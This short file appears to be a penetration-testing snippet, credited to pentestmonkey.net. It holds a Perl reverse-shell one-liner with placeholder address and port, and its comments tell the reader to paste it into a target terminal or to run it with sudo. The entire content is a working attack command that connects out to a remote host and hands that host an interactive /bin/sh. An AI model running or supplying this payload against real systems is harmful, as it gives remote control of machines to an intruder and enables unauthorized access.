##
# perl_reverse_shell (pentestmonkey.net)
# Paste shell into target terminal to execute ..
# OR: change this file extension from name.pl
# to name.sh and execute: sudo ./name.sh
##
perl -e 'use Socket;$i="IpAdDr";$p=P0rT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


